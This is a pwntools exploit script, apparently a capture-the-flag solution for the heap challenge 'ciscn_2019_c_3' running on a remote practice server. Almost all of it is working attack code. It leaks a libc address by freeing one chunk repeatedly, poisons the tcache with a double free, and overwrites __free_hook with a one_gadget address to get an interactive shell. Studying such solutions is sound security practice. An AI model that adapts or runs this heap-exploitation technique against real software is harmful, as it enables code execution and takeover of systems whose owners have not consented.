from pwn import *
filename="./ciscn_2019_c_3"
libc_name="/home/nicholas/glibc-all-in-one/libs/buu_libc6_2.27-3ubuntu1_amd64/libc.so.6"
# io = process(filename)
io = remote('node4.buuoj.cn',29514)
context.log_level='debug'
elf=ELF(filename)
libc=ELF(libc_name)
context.terminal=['tmux','split','-hp','60']

def create(name,size):
    io.recvuntil('Command: ')
    io.sendline('1')
    io.recvuntil('size: ')
    io.sendline(str(size))
    io.recvuntil('name: ')
    io.sendline(name)

def show(index):
    io.recvuntil('Command: ')
    io.sendline('2')
    io.recvuntil('index: ')
    io.sendline(str(index))

def delete(index):
    io.recvuntil('Command: ')
    io.sendline('3')
    io.recvuntil('weapon:')
    io.sendline(str(index))

def debug():
    gdb.attach(io,"brva 0xF81\nbrva 0x120E\nbrva 0xe4b")
    show(0)

def backdoor(num):
    io.recvuntil('Command: ')
    io.sendline('666')
    io.recvuntil('weapon:')
    io.sendline(str(num))
og = [0x4f2c5,0x4f322,0x10a38c]
create("aa",0x100)#0
create("bb",0x60) #1



for i in range(0,8):
    delete(0)
show(0)
# debug()
io.recvuntil('attack_times: ')
libc_info = int(io.recvuntil('\n',drop=True))
success("libc_info: " + hex(libc_info))
# debug()
libc_base = libc_info - 0x3ebca0
success("libc_base: " + hex(libc_base))
free_hook = libc_base+libc.symbols['__free_hook']


create(b"a"*0x10+p64(free_hook-0x10),0x60)#2
delete(2)
delete(2)
for i in range(0x20):
    backdoor(2)
create('a',0x60)
create('a',0x60)
create(p64(libc_base+og[1]),0x60)
delete(1)




# io.sendline("cat flag")

io.interactive()

